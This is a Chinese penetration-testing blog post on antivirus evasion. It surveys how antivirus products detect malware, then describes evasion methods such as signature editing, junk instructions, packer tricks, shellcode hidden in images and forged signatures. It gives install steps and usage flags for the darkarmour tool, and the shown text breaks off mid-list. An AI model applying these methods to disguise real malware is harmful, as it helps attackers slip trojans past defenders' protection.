<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>常用免杀工具 | 我的路-</title><meta name="keywords" content="晚上十一点睡觉,网安,渗透,life"><meta name="author" content="晚上十一点睡觉"><meta name="copyright" content="晚上十一点睡觉"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="免杀相关概念(简单概述) 免杀技术全称为反杀毒技术 AV - Anti Anti-Virus 简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。    技术分类 开源免杀：指在有病毒、">
<meta property="og:type" content="article">
<meta property="og:title" content="常用免杀工具">
<meta property="og:url" content="http://example.com/2022-09-08-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/%E5%B8%B8%E7%94%A8%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/index.html">
<meta property="og:site_name" content="我的路-">
<meta property="og:description" content="免杀相关概念(简单概述) 免杀技术全称为反杀毒技术 AV - Anti Anti-Virus 简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。    技术分类 开源免杀：指在有病毒、">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237500.png">
<meta property="article:published_time" content="2022-09-07T16:37:16.000Z">
<meta property="article:modified_time" content="2022-09-19T12:13:22.888Z">
<meta property="article:author" content="晚上十一点睡觉">
<meta property="article:tag" content="晚上十一点睡觉,网安,渗透,life">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237500.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022-09-08-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/%E5%B8%B8%E7%94%A8%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":150,"languages":{"author":"作者: 晚上十一点睡觉","link":"链接: ","source":"来源: 我的路-","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '常用免杀工具',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-09-19 20:13:22'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237500.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">我的路-</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">常用免杀工具</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-07T16:37:16.000Z" title="发表于 2022-09-08 00:37:16">2022-09-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-09-19T12:13:22.888Z" title="更新于 2022-09-19 20:13:22">2022-09-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/">内网</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/">免杀</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">12.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>50分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2022-09-08-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/%E5%B8%B8%E7%94%A8%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/" data-flag-title="常用免杀工具"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022-09-08-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/%E5%B8%B8%E7%94%A8%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2022-09-08-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/%E5%B8%B8%E7%94%A8%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="免杀相关概念-简单概述"><a href="#免杀相关概念-简单概述" class="headerlink" title="免杀相关概念(简单概述)"></a>免杀相关概念(简单概述)</h1><blockquote>
<p>免杀技术全称为反杀毒技术 AV - Anti Anti-Virus 简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含<strong>反汇编、逆向工程、系统漏洞</strong>等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。  </p>
</blockquote>
<h2 id="技术分类"><a href="#技术分类" class="headerlink" title="技术分类"></a>技术分类</h2><ol>
<li>开源免杀：指在有病毒、木马<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%BA%90%E4%BB%A3%E7%A0%81?fromModule=lemma_inlink">源代码</a>的前提下，通过修改源代码进行免杀。</li>
<li>手工免杀：指在仅有病毒、木马的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6?fromModule=lemma_inlink">可执行文件</a>(.exe)（PE文件）的情况下进行免杀</li>
<li>自动免杀：指的是<a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/%E7%97%85%E6%AF%92">病毒</a>、木马自身能自动变异，如：千面人病毒</li>
</ol>
<h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%8D%E6%9D%80">免杀</a></li>
<li><a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/zh-hans/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF">免杀技术</a></li>
</ul>
</blockquote>
<h1 id="免杀测试环境"><a href="#免杀测试环境" class="headerlink" title="免杀测试环境"></a>免杀测试环境</h1><blockquote>
<p>Windows原生纯净镜像下载：<a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn</a><br>Windows 10激活密钥：W269N-WFGWX-YVC9B-4J6C9-T83GX<br>火绒：<a target="_blank" rel="noopener" href="https://www.huorong.cn/person5.html">https://www.huorong.cn/person5.html</a><br>360安全卫士：<a target="_blank" rel="noopener" href="https://weishi.360.cn/">https://weishi.360.cn/</a><br>360安全卫士极速版：<a target="_blank" rel="noopener" href="https://weishi.360.cn/jisu/">https://weishi.360.cn/jisu/</a><br>tdm-gcc：<a target="_blank" rel="noopener" href="https://jmeubank.github.io/tdm-gcc/download/">https://jmeubank.github.io/tdm-gcc/download/</a><br>mingw-w64：<a target="_blank" rel="noopener" href="https://www.mingw-w64.org/downloads/">https://www.mingw-w64.org/downloads/</a> </p>
<blockquote>
<p>用的较多</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.mingw-w64.org/downloads/#msys2">https://www.mingw-w64.org/downloads/#msys2</a></li>
<li><a target="_blank" rel="noopener" href="https://www.mingw-w64.org/downloads/#cygwin">https://www.mingw-w64.org/downloads/#cygwin</a></li>
</ul>
</blockquote>
<p>Visual Studio：<a target="_blank" rel="noopener" href="https://visualstudio.microsoft.com/zh-hans/">https://visualstudio.microsoft.com/zh-hans/</a></p>
</blockquote>
<h1 id="常见查杀方式"><a href="#常见查杀方式" class="headerlink" title="常见查杀方式"></a>常见查杀方式</h1><blockquote>
<ul>
<li>静态查杀：对文件进行特征匹配的思路</li>
<li>云查杀：对文件内容及行为的检测</li>
</ul>
<blockquote>
<p>主要是观察敏感操作</p>
</blockquote>
<ul>
<li>动态查杀：对其产生的行为进行检测</li>
</ul>
</blockquote>
<h2 id="杀软检测技术介绍"><a href="#杀软检测技术介绍" class="headerlink" title="杀软检测技术介绍"></a>杀软检测技术介绍</h2><blockquote>
<p>每一类型的恶意软件所实施的反检测技术都是不一样的（恶意软件可以分为病毒、木马、僵尸程序、流氓软件、勒索软件、广告程序等）</p>
</blockquote>
<h3 id="基于签名的检测"><a href="#基于签名的检测" class="headerlink" title="基于签名的检测"></a>基于签名的检测</h3><blockquote>
<p>传统的防病毒软件很大程度上依赖于<strong>签名</strong>来识别恶意软件。</p>
<blockquote>
<p>如：微软官方工具SysinternalsSuite中具备官方签名：</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209081442880.png" alt="image-20220908144213690" style="zoom:50%;" />
</blockquote>
<p>工作原理如下：</p>
<p>当恶意软件被杀软公司采集后，杀软后台的研究人员以及动态分析系统便会对这些样本进行分析，一旦确定是恶意软件，后台便会提取恶意文件的标签并将其添加到反病毒软件的签名数据库中。</p>
</blockquote>
<h3 id="静态程序分析"><a href="#静态程序分析" class="headerlink" title="静态程序分析"></a>静态程序分析</h3><blockquote>
<p>静态程序分析是在不实际运行程序的情况下进行的分析。</p>
<p>大部份的静态程序分析的对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。</p>
</blockquote>
<h3 id="动态程序分析"><a href="#动态程序分析" class="headerlink" title="动态程序分析"></a>动态程序分析</h3><blockquote>
<p>动态程序分析是通过在真实或虚拟处理器上执行程序而执行的分析。为了使动态程序分析真实可信，我们必须要能够对各种目标程序的行为进行测试。</p>
</blockquote>
<h3 id="沙盒分析技术"><a href="#沙盒分析技术" class="headerlink" title="沙盒分析技术"></a>沙盒分析技术</h3><blockquote>
<p>沙盒是一个观察计算机病毒的重要环境，用于为一些来源不可信、具备破坏力或无法判定程序意图的程序提供试验环境。</p>
</blockquote>
<h3 id="启发式分析"><a href="#启发式分析" class="headerlink" title="启发式分析"></a>启发式分析</h3><blockquote>
<p>启发式分析是许多计算机防病毒软件使用的一种方法，其被设计用于检测未知的计算机病毒，以及新的病毒变体。<br>启发式分析是<strong>基于专家的分析</strong>，利用它可以对已知或未知的恶意软件进行各种维度的风险衡量，其中多标准分析（MCA）是其中的方法之一，不过启发式分析不是统计分析而是基于可用的数据或统计。</p>
</blockquote>
<h3 id="信息熵检测"><a href="#信息熵检测" class="headerlink" title="信息熵检测"></a>信息熵检测</h3><blockquote>
<p>每个恶意软件都可以被描述成数值性质的属性(例如:信息熵)或者抽象性质的属性，信息熵就是通过找到最合适的量度来验证并且对比恶意软件的属性</p>
</blockquote>
<h3 id="其他常见检测技术"><a href="#其他常见检测技术" class="headerlink" title="其他常见检测技术"></a>其他常见检测技术</h3><h4 id="混淆检测"><a href="#混淆检测" class="headerlink" title="混淆检测"></a>混淆检测</h4><blockquote>
<p>病毒由两个部分组成：载荷（payload）和混淆部件（obfuscator），载荷是用来做坏事的代码，而混淆部件则是病毒用来保护自身免于被查杀的，通常恶意软件开发者都会将其代码进行混淆以降低其代码的可读性<br>所以混淆检测就非常的有针对性。</p>
</blockquote>
<h4 id="加壳检测"><a href="#加壳检测" class="headerlink" title="加壳检测"></a>加壳检测</h4><blockquote>
<p>恶意软件一般都会被压缩加壳，因为加壳会将可执行文件进行压缩打包, 并将压缩数据与解压缩代码组合成单个可执行文件的一种手段。 当执行被压缩过的可执行文件时，解压缩代码会在执行之前从压缩数据中重新创建原始代码。所以检测恶意软件是否使用了加壳技术，也是发现的一种重要手段。</p>
</blockquote>
<h4 id="加密检测"><a href="#加密检测" class="headerlink" title="加密检测"></a>加密检测</h4><blockquote>
<p>恶意软件使用加密对其二进制程序进行加密，以免被逆向分析。加密存在于恶意软件的构建器和存根中，当恶意软件需要解密时，不会用恶意代码常用的正常方法执行它。为了隐藏进程，恶意软件使用了一个有名的RunPE的技术，代码会以挂起的方式执行一个干净的进程（比如iexplorer.exe或者explorer.exe），然后把内存内容修改成恶意代码后再执行。所以检测RunPE的运行，就可以很容易的检测到恶意软件了。</p>
</blockquote>
<h2 id="常见杀软特点"><a href="#常见杀软特点" class="headerlink" title="常见杀软特点"></a>常见杀软特点</h2><h3 id="火绒"><a href="#火绒" class="headerlink" title="火绒"></a>火绒</h3><p>一般加壳，加资源，混淆都可绕过，不过火绒静态查杀更新的快，一般刚出的免杀，不久火绒就能查</p>
<h3 id="360"><a href="#360" class="headerlink" title="360"></a>360</h3><p>360要强一点，加壳不一定能绕，需要一些其他手段</p>
<h1 id="常见免杀方式"><a href="#常见免杀方式" class="headerlink" title="常见免杀方式"></a>常见免杀方式</h1><h2 id="特征码免杀"><a href="#特征码免杀" class="headerlink" title="特征码免杀"></a>特征码免杀</h2><blockquote>
<p>特征码: 特征码是识别一个程序是一个病毒的一段不大于64字节的特征串，简单来讲特征码就是一种只在病毒或木马文件内才有的独一无二的特征，它或是一段字符，或是在特定位置调用的一个函数。总之，如果某个文件具有这个特征码，那反病毒软件就会认为它是病毒。反过来，如果将这些特征码从病毒、木马的文件中抹去或破坏掉，那么反病毒软件就认为这是一个正常文件了。</p>
<p>免杀最基本思想就是破坏特征，这个特征可能是特征码，也可能是行为特征，只要破坏的病毒与木马所固有的特征，并保证其原本的功能没有改变，一次免杀就完成了</p>
<p>为了减少误报率,一般杀毒软件会提取多段特征串,这时,我们往往改一处就可达到免杀效果,当然有些杀毒软件要同时改几处才能免杀。</p>
</blockquote>
<h2 id="花指令免杀"><a href="#花指令免杀" class="headerlink" title="花指令免杀"></a>花指令免杀</h2><blockquote>
<p>花指令就是一段毫无意义的执行指令，也可以称为垃圾指令（类型加1减1之类的无用语句），花指令对程序的执行结果没有影响。在在静态查杀中，AV是靠特征码来判断文件是否有毒的。我们通过花指令让杀毒软件检测不到特征码，干扰杀毒软件正常的检测。加花以后，一些杀毒软件就检测不出来了，但是有些比较强的杀毒软件，病毒还是会被杀的。 </p>
<p>常见的就是在程序开头加入一段计算用的汇编指令和一些入口点内存地址的乱跳转，或加上其他常用程序特有的入口指令来迷惑杀毒软件。因为计算与跳转的最后结果是没有实质的意义的，所以这么做并不影响<a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F">程序</a>的正常运行。但能使一些杀毒软件无法正确识别木马程序，从而达到免杀的效果。</p>
<p>如杀毒软件本来是在 0x00001000  到 0x00005000  处找一个特征码。但因为我们填充了花指令，恶意代码跑到了 0x00008000  这个位置，就会导致特征码查杀失败，从而达到免杀目的。</p>
<p>花指令撰写方法：找到程序的一个全0代码段</p>
</blockquote>
<h2 id="加壳免杀"><a href="#加壳免杀" class="headerlink" title="加壳免杀"></a>加壳免杀</h2><blockquote>
<p>软件加壳为软件加密，对于现在的壳来说，根据作用与加壳后的不同效果，可以将其分为两类，一类是压缩壳，另一类是加密壳。但不管是<strong>压缩壳还是加密壳</strong>，它们的大致原理与执行流程都是一样的，应用程序加壳后就会变成PE文件里的一段数据，在执行加壳文件时会先执行壳，再由壳将已加密的程序解密并还原到内存中去</p>
<h3 id="加冷门壳"><a href="#加冷门壳" class="headerlink" title="加冷门壳"></a>加冷门壳</h3><blockquote>
<p>举例来说，如果说程序是一张烙饼，那壳就是包装袋，可以让你发现不了包装袋里的东西是什么。比较常见的壳一般容易被杀毒软件识别，所以加壳有时候会使用到生僻壳，就是不常用的壳。去买口香糖你会发现至少有两层包装，所以壳也可以加多重壳，让杀毒软件看不懂。如果你看到一个袋子上面写着干燥剂、有毒之类的字你也许就不会对他感兴趣了吧，这就是伪装壳，把一种壳伪装成其他壳，干扰杀毒软件正常的检测。</p>
</blockquote>
<h3 id="加壳改壳"><a href="#加壳改壳" class="headerlink" title="加壳改壳"></a>加壳改壳</h3><blockquote>
<p>加壳改壳是病毒免杀常用的手段之一，加壳改壳原理是将一个木马文件加上upx壳或者其它壳后用lordpe将文件<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%A5%E5%8F%A3%E7%82%B9?fromModule=lemma_inlink">入口点</a>加1，然后将区段字符全部去掉，然后用od打开免杀的木马在入口上下100字符内修改一些代码让杀毒软件查不出来是什么壳就不知道怎么脱就可以实现免杀的目的，但这种技术只有熟悉汇编语言的人才会，这种免杀方法高效可以一口气过众多杀软也是免杀爱好者应该学会的一种技术。</p>
</blockquote>
<h3 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h3><blockquote>
<p>加密是将明文信息隐匿起来，使之在缺少特殊信息时全部或部分数据不可读，令杀毒软件无从下手。</p>
<p>而解密就是令在宿主电脑中的病毒得到密钥，从而突然发作。</p>
</blockquote>
</blockquote>
<h2 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h2><blockquote>
<p>将 shellcode  和加载器分离</p>
<p>比如，一般杀软只会对 exe 文件进行查杀，但是我们将 shellcode 写入到图片中，那么杀软只会认为它是正常的图片，然后我们通过加载器将 shellcode 读取出来，加载进内存执行</p>
</blockquote>
<h2 id="资源修改"><a href="#资源修改" class="headerlink" title="资源修改"></a>资源修改</h2><blockquote>
<p>有些杀软会设置有扫描⽩名单，⽐如之前把程序图标替换为360安全卫⼠图标就能 过360的查杀。 </p>
<ul>
<li>加资源：使⽤ ResHacker 对⽂件进⾏资源操作，找来多个正常软件，将它们的资源加⼊到⾃⼰软件， </li>
<li>替换资源：使⽤ ResHacker 替换⽆⽤的资源（Version等）。 </li>
<li>加签名：使⽤签名伪造⼯具，将正常软件的签名信息加⼊到⾃⼰软件中。</li>
</ul>
</blockquote>
<h2 id="改程序入口点"><a href="#改程序入口点" class="headerlink" title="改程序入口点"></a>改程序入口点</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3%E7%82%B9">程序入口点</a>修改就是改变入口点，通常用到的方法是在入口点的地址加1或把入口点地址拆开，也有加花指令之后把原入口点修改到花指令的入口点上令电脑先处理那段没意义的指令，再在花指令后再加跳转<a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/%E4%BB%A3%E7%A0%81">代码</a>，跳转到程序执行数据的入口点上，令程序正常运行。</p>
</blockquote>
<h2 id="免杀修改技巧——修改内存特征码："><a href="#免杀修改技巧——修改内存特征码：" class="headerlink" title="免杀修改技巧——修改内存特征码："></a>免杀修改技巧——修改内存特征码：</h2><blockquote>
<p>1.直接修改特征码的十六进制法</p>
<p>2.修改字符串大小写法</p>
<p>3.等价替换法</p>
<p>4.指令顺序调换法</p>
<p>5.通用跳转法</p>
</blockquote>
<h2 id="最新的无特征免杀法"><a href="#最新的无特征免杀法" class="headerlink" title="最新的无特征免杀法"></a>最新的无特征免杀法</h2><blockquote>
<p>何为无特征免杀法？就是脱离传统的定位方法，直接盲免，就对于整体区段进行异或加密，是整体代码发生变换，从而逃脱杀毒软件的查杀，是当今最流行的方法。 </p>
</blockquote>
<h1 id="darkarmour"><a href="#darkarmour" class="headerlink" title="darkarmour"></a>darkarmour</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/bats3c/darkarmour">https://github.com/bats3c/darkarmour</a></p>
</blockquote>
<p>直接使用GitHub上面的恶意木马是会直接被查杀，文件落地就会被直接查杀。darkarmour直接从内存加载文件。从内存中存储和执行加密的 Windows 二进制文件，无需任何磁盘操作。木马在内存中加壳绕过静态检测。注意经由darkarmour加密的可执行文件，大概率是可过杀软的~~~应用范围更广</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote>
<p>它使用 python标准库，因此无需担心任何 python 依赖项，因此您可能遇到的唯一问题是二进制依赖项。</p>
<ul>
<li>Linux下：（建议在linux上操作）</li>
</ul>
<blockquote>
<p> 所需的二进制文件是： i686-w64-mingw32-g++ 、 i686-w64-mingw32-gcc  和 upx（也可能是 osslsigncode ）。这些都可以通过apt安装</p>
</blockquote>
<ul>
<li>windows下：</li>
</ul>
<blockquote>
<p>mingw-w64前面有讲到的编译器</p>
</blockquote>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode</span><br></pre></td></tr></table></figure>

<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help 显示此帮助信息并退出</span><br><span class="line">-f FILE, --file FILE 要加密的文件，如果没有被告知，则假定为二进制文件</span><br><span class="line">-e ENCRYPT, --encrypt ENCRYPT 要使用的加密算法(xor),只有xor</span><br><span class="line">-S SHELLCODE, --shellcode SHELLCODE 包含shellcode的文件，需要 &quot;msfvenom -f raw&quot;的格式。</span><br><span class="line">-b, --binary 如果文件是二进制的exe文件，则提供。</span><br><span class="line">-d, --dll 使用反射性dll注入，在另一个进程中执行二进制文件</span><br><span class="line">-u, --upx 用upx打包可执行文件</span><br><span class="line">-j, --jmp 使用基于jmp的pe加载器，就是将可执行文件直接加载到内存</span><br><span class="line">-r, --runpe 使用runpe来加载pe</span><br><span class="line">-s, --source 如果文件是c源代码，则提供该文件。</span><br><span class="line">-k 